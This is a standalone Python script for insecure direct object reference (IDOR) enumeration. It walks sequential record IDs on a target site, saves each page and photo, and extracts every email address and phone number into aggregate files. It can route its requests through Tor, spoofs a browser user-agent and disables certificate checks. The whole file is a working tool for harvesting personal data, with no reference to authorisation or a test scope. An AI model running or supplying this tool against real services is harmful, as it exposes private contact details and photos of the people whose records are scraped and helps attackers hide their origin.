#!/usr/bin/env python3
"""Sequential IDOR/PII enumeration — standard id-walk with email/phone aggregation.
Usage: idor_enum.py --base https://target --path '/item/{id}' \
       --start 1 --end 200 --out DIR [--egress tor] [--delay 3] [--photo-param '/img/{id}']
"""
import argparse, json, re, ssl, sys, time, urllib.request, urllib.error
from datetime import datetime, timezone
from pathlib import Path

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
EMAIL = re.compile(rb"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
PHONE = re.compile(rb"(?:\+?\d[\d\s-]{8,14}\d)")

def opener(egress):
    handlers = [urllib.request.HTTPSHandler(context=ssl._create_unverified_context())]
    if egress == "tor":
        handlers.append(urllib.request.ProxyHandler({
            "http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}))
    return urllib.request.build_opener(*handlers)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--path", required=True, help="pattern with {id}")
    ap.add_argument("--start", type=int, default=1)
    ap.add_argument("--end", type=int, default=100)
    ap.add_argument("--out", required=True)
    ap.add_argument("--egress", default="direct")
    ap.add_argument("--delay", type=float, default=3.0)
    ap.add_argument("--photo-param", default="")
    ap.add_argument("--stop-after-miss", type=int, default=10, help="stop after N consecutive misses")
    args = ap.parse_args()

    out = Path(args.out); out.mkdir(parents=True, exist_ok=True)
    op = opener(args.egress)
    hits, emails, phones = [], set(), set()
    misses = 0
    logf = open(out / "idor_walk.log", "a")

    for i in range(args.start, args.end + 1):
        url = args.base.rstrip("/") + args.path.replace("{id}", str(i))
        try:
            req = urllib.request.Request(url, headers={"User-Agent": UA})
            with op.open(req, timeout=15) as r:
                body = r.read()
                status = r.status
        except urllib.error.HTTPError as e:
            status, body = e.code, e.read() or b""
        except Exception as e:
            print(f"{i} ERR {e}", file=logf); time.sleep(args.delay); continue

        if status == 200 and len(body) > 200:
            misses = 0
            (out / f"record_{i}.html").write_bytes(body)
            hits.append(i)
            for m in EMAIL.findall(body): emails.add(m.decode(errors="ignore"))
            for m in PHONE.findall(body): phones.add(m.decode(errors="ignore"))
            if args.photo_param:
                purl = args.base.rstrip("/") + args.photo_param.replace("{id}", str(i))
                try:
                    with op.open(urllib.request.Request(purl, headers={"User-Agent": UA}), timeout=15) as pr:
                        (out / f"photo_{i}.bin").write_bytes(pr.read())
                except Exception:
                    pass
            if len(hits) % 25 == 0:
                print(f"progress: {len(hits)} hits up to id {i}")
        else:
            misses += 1
            if misses >= args.stop_after_miss and hits:
                print(f"stopping at id {i}: {misses} consecutive misses after {len(hits)} hits")
                break
        time.sleep(args.delay)

    (out / "emails.txt").write_text("\n".join(sorted(emails)))
    (out / "phones.txt").write_text("\n".join(sorted(phones)))
    summary = {"walked": [args.start, args.end], "hits": len(hits),
               "hit_ids": hits, "emails": len(emails), "phones": len(phones),
               "ts": datetime.now(timezone.utc).isoformat()}
    (out / "summary.json").write_text(json.dumps(summary, indent=2))
    print(json.dumps(summary))
    return 0 if hits else 1

if __name__ == "__main__":
    sys.exit(main())
